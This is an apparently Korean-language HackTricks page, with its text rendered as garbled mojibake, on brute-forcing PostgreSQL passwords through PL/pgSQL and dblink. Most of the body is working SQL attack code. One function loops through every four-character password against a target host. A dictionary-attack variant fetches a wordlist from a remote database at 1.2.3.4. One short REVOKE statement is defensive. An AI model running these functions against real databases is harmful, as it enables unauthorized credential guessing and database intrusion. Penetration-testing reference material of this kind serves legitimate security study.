# PL/pgSQL ë¹„ë°€ë²ˆí˜¸ ë¬´ì°¨ë³„ ëŒ€ì…

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

**[ì›ë³¸ ë¬¸ì„œì—ì„œ ì´ëŸ¬í•œ ê³µê²©ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ë¥¼ ì°¾ìœ¼ì„¸ìš”](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**.

PL/pgSQLì€ **ì ˆì°¨ì  ì œì–´ë¥¼ í–¥ìƒ**ì‹œì¼œ SQLì˜ ê¸°ëŠ¥ì„ í™•ì¥í•˜ëŠ” **ì™„ì „í•œ í”„ë¡œê·¸ë˜ë° ì–¸ì–´**ì…ë‹ˆë‹¤. ì—¬ê¸°ì—ëŠ” ë£¨í”„ ë° ë‹¤ì–‘í•œ ì œì–´ êµ¬ì¡°ì˜ í™œìš©ì´ í¬í•¨ë©ë‹ˆë‹¤. PL/pgSQL ì–¸ì–´ë¡œ ì‘ì„±ëœ í•¨ìˆ˜ëŠ” SQL ë¬¸ ë° íŠ¸ë¦¬ê±°ì— ì˜í•´ í˜¸ì¶œë  ìˆ˜ ìˆì–´ ë°ì´í„°ë² ì´ìŠ¤ í™˜ê²½ ë‚´ì—ì„œì˜ ì‘ì—… ë²”ìœ„ë¥¼ ë„“í™ë‹ˆë‹¤.

ì´ ì–¸ì–´ë¥¼ ì•…ìš©í•˜ì—¬ PostgreSQLì— ì‚¬ìš©ì ìê²© ì¦ëª…ì„ ë¬´ì°¨ë³„ ëŒ€ì…í•˜ë„ë¡ ìš”ì²­í•  ìˆ˜ ìˆì§€ë§Œ, ë°ì´í„°ë² ì´ìŠ¤ì— ì¡´ì¬í•´ì•¼ í•©ë‹ˆë‹¤. ì¡´ì¬ ì—¬ë¶€ëŠ” ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+---------
plpgsql |
```
ê¸°ë³¸ì ìœ¼ë¡œ, **í•¨ìˆ˜ë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì€ PUBLICì— ë¶€ì—¬ëœ ê¶Œí•œì…ë‹ˆë‹¤**, ì—¬ê¸°ì„œ PUBLICì€ í•´ë‹¹ ë°ì´í„°ë² ì´ìŠ¤ ì‹œìŠ¤í…œì˜ ëª¨ë“  ì‚¬ìš©ìë¥¼ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´, ê´€ë¦¬ìëŠ” PUBLIC ë„ë©”ì¸ì—ì„œ USAGE ê¶Œí•œì„ ì² íšŒí•´ì•¼ í–ˆì„ ê²ƒì…ë‹ˆë‹¤:
```sql
REVOKE ALL PRIVILEGES ON LANGUAGE plpgsql FROM PUBLIC;
```
ê·¸ ê²½ìš°, ì´ì „ ì¿¼ë¦¬ëŠ” ë‹¤ë¥¸ ê²°ê³¼ë¥¼ ì¶œë ¥í•  ê²ƒì…ë‹ˆë‹¤:
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+-----------------
plpgsql | {admin=U/admin}
```
ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‘ë™í•˜ë ¤ë©´ **`dblink` í•¨ìˆ˜ê°€ ì¡´ì¬í•´ì•¼ í•©ë‹ˆë‹¤**. ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš° ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ìƒì„±í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
CREATE EXTENSION dblink;
```
## ë¹„ë°€ë²ˆí˜¸ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©

ë‹¤ìŒì€ 4ìë¦¬ ë¹„ë°€ë²ˆí˜¸ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤:
```sql
//Create the brute-force function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE
word TEXT;
BEGIN
FOR a IN 65..122 LOOP
FOR b IN 65..122 LOOP
FOR c IN 65..122 LOOP
FOR d IN 65..122 LOOP
BEGIN
word := chr(a) || chr(b) || chr(c) || chr(d);
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;
EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection
THEN
-- do nothing
END;
END LOOP;
END LOOP;
END LOOP;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';

//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
_4ìë¦¬ë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…í•˜ëŠ” ê²ƒì¡°ì°¨ ëª‡ ë¶„ì´ ê±¸ë¦´ ìˆ˜ ìˆìŒì„ ìœ ì˜í•˜ì„¸ìš”._

ë˜í•œ **ë‹¨ì–´ ëª©ë¡ì„ ë‹¤ìš´ë¡œë“œ**í•˜ê³  í•´ë‹¹ ë¹„ë°€ë²ˆí˜¸ë§Œ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì‚¬ì „ ê³µê²©):
```sql
//Create the function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
BEGIN
FOR word IN (SELECT word FROM dblink('host=1.2.3.4
user=name
password=qwerty
dbname=wordlists',
'SELECT word FROM wordlist')
RETURNS (word TEXT)) LOOP
BEGIN
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;

EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection THEN
-- do nothing
END;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql'

-- Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
